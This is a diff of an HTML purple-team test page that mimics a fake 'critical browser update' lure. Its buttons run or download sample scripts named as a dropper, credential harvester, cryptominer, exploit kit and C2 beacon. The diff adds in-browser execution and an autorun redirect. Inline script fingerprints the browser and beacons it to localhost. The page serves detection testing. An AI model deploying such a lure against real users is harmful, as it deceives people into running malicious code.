@@ -1,20 +1,12 @@
 <!DOCTYPE html>
 <!--
     PURPLE TEAM TEST ARTIFACT
-    Name: Fake JS Update / Drive-by Download Landing Page
-    Purpose: Simulates a malicious redirect page that tricks users into
-             downloading "browser updates" or "required plugins" that are
-             actually the benign test JS samples.
+    Name: Fake JS Update / Drive-by Download Landing Page (v2)
     
-    DEPLOYMENT: Host this on an external web server your purple team controls.
-    Place the sample .js files in the same directory.
-    
-    WHAT TO TEST:
-    1. Does your SWG/proxy block access to this page?
-    2. Does browser isolation kick in?
-    3. Does your EDR alert on the downloaded .js files?
-    4. Does your SIEM correlate the redirect + download chain?
-    5. Do your users report the suspicious page via phishing button?
+    CHANGES FROM v1:
+    - Primary buttons now EXECUTE the JS in-browser via runner.html
+    - Secondary "download" links preserved for file-download control testing
+    - Auto-execute option via URL parameter: ?autorun=1&sample=sample1_obfuscated_dropper.js
     
     MITRE: T1189 (Drive-by Compromise), T1204.002 (User Execution: Malicious File)
 -->
@@ -22,7 +14,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- Suspicious meta tags that security tools may flag -->
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <title>Critical Browser Update Required - Security Patch KB5034441</title>
     <style>
@@ -44,15 +35,18 @@
             display: flex;
             align-items: center;
             justify-content: center;
+            padding: 20px;
         }
         .modal {
             background: #fff;
             color: #333;
             border-radius: 8px;
-            max-width: 550px;
-            width: 90%;
+            max-width: 600px;
+            width: 100%;
             box-shadow: 0 20px 60px rgba(0,0,0,0.5);
             overflow: hidden;
+            max-height: 90vh;
+            overflow-y: auto;
         }
         .modal-header {
             background: linear-gradient(135deg, #ff6b35, #d63031);
@@ -62,20 +56,10 @@
             align-items: center;
             gap: 12px;
         }
-        .modal-header .icon {
-            font-size: 32px;
-        }
-        .modal-header h2 {
-            font-size: 18px;
-            font-weight: 600;
-        }
-        .modal-body {
-            padding: 25px;
-        }
-        .modal-body p {
-            margin-bottom: 15px;
-            line-height: 1.6;
-        }
+        .modal-header .icon { font-size: 32px; }
+        .modal-header h2 { font-size: 18px; font-weight: 600; }
+        .modal-body { padding: 25px; }
+        .modal-body p { margin-bottom: 15px; line-height: 1.6; }
         .warning-box {
             background: #fff3cd;
             border: 1px solid #ffc107;
@@ -85,14 +69,74 @@
             font-size: 14px;
             color: #856404;
         }
-        .download-section {
+
+        /* Sample card grid */
+        .samples-grid {
+            display: grid;
+            gap: 12px;
             margin-top: 20px;
         }
-        .download-btn {
+        .sample-card {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 8px;
+            padding: 14px 18px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+        }
+        .sample-card .info {
+            flex: 1;
+        }
+        .sample-card .info .name {
+            font-weight: 600;
+            font-size: 14px;
+            color: #2d3436;
+        }
+        .sample-card .info .desc {
+            font-size: 12px;
+            color: #636e72;
+            margin-top: 2px;
+        }
+        .sample-card .actions {
+            display: flex;
+            gap: 6px;
+            flex-shrink: 0;
+        }
+        .btn {
+            display: inline-block;
+            padding: 8px 16px;
+            border: none;
+            border-radius: 5px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            color: white;
+            text-align: center;
+            transition: transform 0.1s, opacity 0.1s;
+        }
+        .btn:hover { transform: scale(1.03); opacity: 0.9; }
+        .btn-run {
+            background: linear-gradient(135deg, #d63031, #e17055);
+        }
+        .btn-download {
+            background: linear-gradient(135deg, #636e72, #2d3436);
+            font-size: 11px;
+            padding: 8px 12px;
+        }
+
+        /* Top CTA */
+        .primary-cta {
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .btn-primary-big {
             display: inline-block;
             background: linear-gradient(135deg, #0984e3, #6c5ce7);
             color: white;
-            padding: 14px 28px;
+            padding: 14px 32px;
             border: none;
             border-radius: 6px;
             font-size: 16px;
@@ -100,16 +144,23 @@
             cursor: pointer;
             text-decoration: none;
             transition: transform 0.1s;
-            margin: 5px;
         }
-        .download-btn:hover {
-            transform: scale(1.02);
+        .btn-primary-big:hover { transform: scale(1.02); }
+
+        .divider {
+            border: none;
+            border-top: 1px solid #eee;
+            margin: 20px 0 15px;
         }
-        .download-btn.secondary {
-            background: linear-gradient(135deg, #636e72, #2d3436);
+        .section-label {
             font-size: 13px;
-            padding: 10px 20px;
+            color: #888;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 10px;
         }
+
         .fine-print {
             font-size: 11px;
             color: #999;
@@ -117,12 +168,9 @@
             padding-top: 15px;
             border-top: 1px solid #eee;
         }
-        /* Purple team banner - visible to analysts */
         .pt-banner {
             position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
+            bottom: 0; left: 0; right: 0;
             background: #6c5ce7;
             color: white;
             text-align: center;
@@ -131,17 +179,10 @@
             font-weight: 600;
             z-index: 2000;
         }
-        .pt-banner a { color: #dfe6e9; }
-        .samples-grid {
-            display: grid;
-            gap: 8px;
-            margin-top: 15px;
-        }
     </style>
 </head>
 <body>
 
-    <!-- Simulated "urgent update" modal (social engineering lure) -->
     <div class="overlay">
         <div class="modal">
             <div class="modal-header">
@@ -163,32 +204,61 @@
                     your system vulnerable to data theft and unauthorized access.
                 </div>
 
-                <p style="font-size:14px;">
-                    Click below to download and apply the required security patch.
-                    This update is signed and verified by your IT department.
-                </p>
-
-                <!-- Primary "bait" download - most likely to trigger controls -->
-                <div class="download-section">
-                    <a href="sample1_obfuscated_dropper.js" download class="download-btn">
-                        &#11015; Download Security Patch (JS Engine Update)
+                <!-- Primary CTA - runs Sample 1 (most common initial access pattern) -->
+                <div class="primary-cta">
+                    <a href="runner.html?sample=sample1_obfuscated_dropper.js" class="btn-primary-big">
+                        &#9889; Apply Security Patch Now
                     </a>
                 </div>
 
-                <!-- Additional sample downloads for comprehensive testing -->
+                <hr class="divider">
+                <div class="section-label">Additional Required Updates</div>
+
+                <!-- Individual sample cards with Run + Download options -->
                 <div class="samples-grid">
-                    <a href="sample2_credential_harvester.js" download class="download-btn secondary">
-                        &#11015; Browser Auth Module Update
-                    </a>
-                    <a href="sample3_cryptominer_sim.js" download class="download-btn secondary">
-                        &#11015; Performance Optimization Module
-                    </a>
-                    <a href="sample4_exploit_kit_landing.js" download class="download-btn secondary">
-                        &#11015; Plugin Compatibility Patch
-                    </a>
-                    <a href="sample5_c2_beacon.js" download class="download-btn secondary">
-                        &#11015; Telemetry &amp; Diagnostics Fix
-                    </a>
+                    <div class="sample-card">
+                        <div class="info">
+                            <div class="name">Browser Auth Module</div>
+                            <div class="desc">Authentication &amp; session security fix</div>
+                        </div>
+                        <div class="actions">
+                            <a href="runner.html?sample=sample2_credential_harvester.js" class="btn btn-run">&#9654; Install</a>
+                            <a href="sample2_credential_harvester.js" download class="btn btn-download">&#8615; .js</a>
+                        </div>
+                    </div>
+
+                    <div class="sample-card">
+                        <div class="info">
+                            <div class="name">Performance Module</div>
+                            <div class="desc">Rendering engine optimization</div>
+                        </div>
+                        <div class="actions">
+                            <a href="runner.html?sample=sample3_cryptominer_sim.js" class="btn btn-run">&#9654; Install</a>
+                            <a href="sample3_cryptominer_sim.js" download class="btn btn-download">&#8615; .js</a>
+                        </div>
+                    </div>
+
+                    <div class="sample-card">
+                        <div class="info">
+                            <div class="name">Plugin Compatibility Patch</div>
+                            <div class="desc">Extension API security update</div>
+                        </div>
+                        <div class="actions">
+                            <a href="runner.html?sample=sample4_exploit_kit_landing.js" class="btn btn-run">&#9654; Install</a>
+                            <a href="sample4_exploit_kit_landing.js" download class="btn btn-download">&#8615; .js</a>
+                        </div>
+                    </div>
+
+                    <div class="sample-card">
+                        <div class="info">
+                            <div class="name">Telemetry &amp; Diagnostics</div>
+                            <div class="desc">System reporting module fix</div>
+                        </div>
+                        <div class="actions">
+                            <a href="runner.html?sample=sample5_c2_beacon.js" class="btn btn-run">&#9654; Install</a>
+                            <a href="sample5_c2_beacon.js" download class="btn btn-download">&#8615; .js</a>
+                        </div>
+                    </div>
                 </div>
 
                 <div class="fine-print">
@@ -200,30 +270,14 @@
         </div>
     </div>
 
-    <!-- Purple Team identification banner (always visible for analysts) -->
     <div class="pt-banner">
         &#128156; PURPLE TEAM EXERCISE &mdash; This page is a controlled test artifact. 
-        All downloads are benign. All C2/exfil endpoints point to localhost.
+        All JS samples are benign. All C2/exfil endpoints point to localhost.
         Contact: [YOUR_PURPLE_TEAM_EMAIL] &mdash; Exercise ID: PT-JSFAKER-2026
     </div>
 
-    <!-- Suspicious inline script that scanners should flag -->
+    <!-- Inline fingerprinting (same as v1 - tests SWG content inspection) -->
     <script>
-        // Auto-download attempt after 10 seconds (common in drive-by kits)
-        // Commented out by default - uncomment for more aggressive testing
-        /*
-        setTimeout(function() {
-            var a = document.createElement('a');
-            a.href = 'sample1_obfuscated_dropper.js';
-            a.download = 'security-update-kb5034441.js';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            console.log('[PURPLE TEAM] Auto-download triggered after 10s delay.');
-        }, 10000);
-        */
-
-        // Browser fingerprint sent as query param (for SWG/proxy detection testing)
         var _fp = btoa(JSON.stringify({
             ua: navigator.userAgent,
             lang: navigator.language,
@@ -231,13 +285,20 @@
             tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
             test: 'PURPLE_TEAM'
         }));
-
-        // Simulated tracking pixel (common in phishing/malware landing pages)
         var img = new Image();
         img.src = 'http://127.0.0.1:65535/track?fp=' + encodeURIComponent(_fp);
 
-        console.log('[PURPLE TEAM] Landing page loaded. Fingerprint beacon sent to localhost.');
-        console.log('[PURPLE TEAM] All download links point to benign test JS files.');
+        // --- Auto-run mode: add ?autorun=1&sample=FILENAME to URL ---
+        var params = new URLSearchParams(window.location.search);
+        if (params.get('autorun') === '1') {
+            var sample = params.get('sample') || 'sample1_obfuscated_dropper.js';
+            setTimeout(function() {
+                window.location.href = 'runner.html?sample=' + encodeURIComponent(sample);
+            }, 2000);
+            console.log('[PURPLE TEAM] Auto-run enabled. Redirecting to runner in 2s...');
+        }
+
+        console.log('[PURPLE TEAM] Landing page v2 loaded.');
     </script>
 </body>
 </html>
